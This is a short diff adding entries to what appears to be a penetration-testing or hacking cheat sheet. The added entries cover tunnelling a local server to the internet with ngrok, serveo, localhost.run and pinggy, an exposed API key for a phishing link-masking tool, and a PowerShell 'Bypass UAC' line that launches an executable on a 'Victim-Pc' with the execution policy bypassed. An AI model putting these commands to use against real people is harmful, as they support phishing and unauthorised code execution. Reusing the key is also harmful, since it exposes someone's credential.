@@ -1380,4 +1380,17 @@ $lnk.Save()
 .kdbx
  keepassxc file.kdbx
  Also While cracking keepass hash using hashcat remove the username in the beginning of the hash.
+
+Expose localhost to internet
+ngrok http http://localhost:8080  \\change url to forward accordingly
+ngrok http --url=solely-peaceful-dory.ngrok-free.app 80 \\this is custom domain, change port ac ordingly tpo forward
+
+Similar to ngrok, serveo and localhost.run is a free platform 
+ssh -R 80:localhost:3000 serveo.net  \\here port 80 is serveo and it will redirect to our local host running on port 3000
+ssh -R 80:localhost:8080 nokey@localhost.run  \\same here
+ssh -p 443 -R0:localhost:3000 -L4300:localhost:4300 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 xqEFAxpLsLB@ap.a.pinggy.io  \\change port 3000 
+API key for Phismasker: 96c677373f684caabbde82f2109f32dd or get this in this site https://rebrand.ly/
+
+Bypass UAC 
+Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {Start-Process 'C:\Users\Victim-Pc\Desktop\ts.exe'}" \\bypass UAC
 ```
